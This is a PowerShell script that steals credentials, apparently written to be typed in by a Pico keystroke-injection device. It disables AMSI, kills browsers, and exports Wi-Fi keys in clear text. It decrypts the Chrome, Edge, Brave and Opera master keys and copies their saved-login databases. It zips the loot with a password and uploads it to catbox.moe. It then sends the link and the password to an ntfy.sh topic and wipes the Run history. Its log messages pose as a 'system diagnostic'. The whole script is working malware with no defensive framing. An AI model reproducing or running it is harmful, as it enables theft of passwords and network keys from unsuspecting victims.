# ──────────────────────────────────────────────────────────────
# CONFIGURATION
# ──────────────────────────────────────────────────────────────

$topic       = "data_stwealer_hideen_"               
$zipPassword = "fuckthesociety123!"                     

$sevenZipPaths = @(
    "$env:ProgramFiles\7-Zip\7z.exe",
    "${env:ProgramFiles(x86)}\7-Zip\7z.exe",
    "C:\7-Zip\7z.exe"
)

# ──────────────────────────────────────────────────────────────
# AMSI BLINDER (Crucial for bypassing detection)
# ──────────────────────────────────────────────────────────────
try {
    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
} catch {}

# ──────────────────────────────────────────────────────────────
# LOG FUNCTION
# ──────────────────────────────────────────────────────────────

function Write-Log {
    param([string]$msg)
    $timestamp = Get-Date -Format "HH:mm:ss"
    $line = "$timestamp | $msg"
    
    Write-Host $line
    
    try {
        Invoke-RestMethod -Uri "https://ntfy.sh/$topic" `
                          -Method Post `
                          -Body $line `
                          -TimeoutSec 6 `
                          -ErrorAction SilentlyContinue
    } catch {}
}

# ──────────────────────────────────────────────────────────────
# START
# ──────────────────────────────────────────────────────────────

Write-Log "=== SYSTEM DIAGNOSTIC STARTED ==="

# Load required .NET assemblies quietly
try {
    [void][Reflection.Assembly]::LoadWithPartialName("System.Security")
    Write-Log "Security module initialized"
} catch {
    Write-Log "Module error - $($_.Exception.Message)"
}

# ──────────────────────────────────────────────────────────────
# Kill browsers to release file locks
# ──────────────────────────────────────────────────────────────

Write-Log "Preparing environment..."
$pList = @("chrome","msedge","brave","opera")
foreach ($p in $pList) {
    Stop-Process -Name $p -Force -ErrorAction SilentlyContinue
}
Start-Sleep -Seconds 2

# ──────────────────────────────────────────────────────────────
# Prepare workspace
# ──────────────────────────────────────────────────────────────

$dir = "$env:TEMP\ProcCache_$(Get-Random)"
$zip = "$env:TEMP\Report_$(Get-Random).zip"

if (Test-Path $dir) { Remove-Item -Recurse -Force $dir -EA SilentlyContinue }
New-Item -ItemType Directory $dir | Out-Null

# ──────────────────────────────────────────────────────────────
# Export Wi-Fi profiles
# ──────────────────────────────────────────────────────────────

Write-Log "Analyzing Network Profiles..."
netsh wlan export profile folder=$dir key=clear | Out-Null

# ──────────────────────────────────────────────────────────────
# Collect browser artifacts
# ──────────────────────────────────────────────────────────────

$browsers = @{
    "CH" = "$env:LOCALAPPDATA\Google\Chrome\User Data"
    "ED" = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
    "BR" = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
    "OP" = "$env:APPDATA\Opera Software\Opera Stable"
}

foreach ($name in $browsers.Keys) {
    $basePath = $browsers[$name]
    $localStatePath = Join-Path $basePath "Local State"

    if (-not (Test-Path $localStatePath)) { continue }

    try {
        $json = Get-Content $localStatePath -Raw | ConvertFrom-Json
        $encKey = [Convert]::FromBase64String($json.os_crypt.encrypted_key)
        $masterKeyBytes = $encKey[5..($encKey.Length-1)]
        $masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect($masterKeyBytes, $null, 'CurrentUser')
        $keyHex = [BitConverter]::ToString($masterKey) -replace '-'
        $keyHex | Out-File "$dir\$($name)_m.txt" -Encoding ascii

        $profileFolder = if ($name -eq "OP") { $basePath } else { Join-Path $basePath "Default" }
        $loginDbPath = Join-Path $profileFolder "Login Data"

        if (Test-Path $loginDbPath) {
            Copy-Item $loginDbPath "$dir\$($name)_d.db" -Force
        }
    }
    catch {
        Write-Log "Error processing $name artifact"
    }
}

# ──────────────────────────────────────────────────────────────
# Create PASSWORD-PROTECTED ZIP with 7-Zip
# ──────────────────────────────────────────────────────────────

Write-Log "Finalizing package..."

$sevenZip = $null
foreach ($path in $sevenZipPaths) {
    if (Test-Path $path) {
        $sevenZip = $path
        break
    }
}

if ($sevenZip) {
    & $sevenZip a -tzip -mx=5 "-p$zipPassword" "-mem=AES256" $zip "$dir\*" | Out-Null
} else {
    # Fallback to standard ZIP if 7-Zip isn't there (No password though)
    Add-Type -AssemblyName System.IO.Compression.FileSystem
    [System.IO.Compression.ZipFile]::CreateFromDirectory($dir, $zip)
}

# ──────────────────────────────────────────────────────────────
# Upload to catbox.moe
# ──────────────────────────────────────────────────────────────

if (Test-Path $zip) {
    Write-Log "Synchronizing..."
    $uploadResult = curl.exe -s -F "reqtype=fileupload" -F "fileToUpload=@$zip" https://catbox.moe/user/api.php

    if ($uploadResult -match '^https?://files\.catbox\.moe/') {
        $message = "Report ready: $uploadResult`nKey: $zipPassword"
        Invoke-RestMethod -Uri "https://ntfy.sh/$topic" -Method Post -Body $message -EA SilentlyContinue
        Write-Log "Sync Successful"
    }
}

# ──────────────────────────────────────────────────────────────
# Cleanup
# ──────────────────────────────────────────────────────────────

# Wipe Run box history
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -EA SilentlyContinue
Remove-Item -Recurse -Force $dir, $zip -EA SilentlyContinue

Write-Log "=== OPERATION COMPLETE ==="

# NO EXIT COMMAND HERE
# The Pico will type 'exit' after its sleep timer finishes.
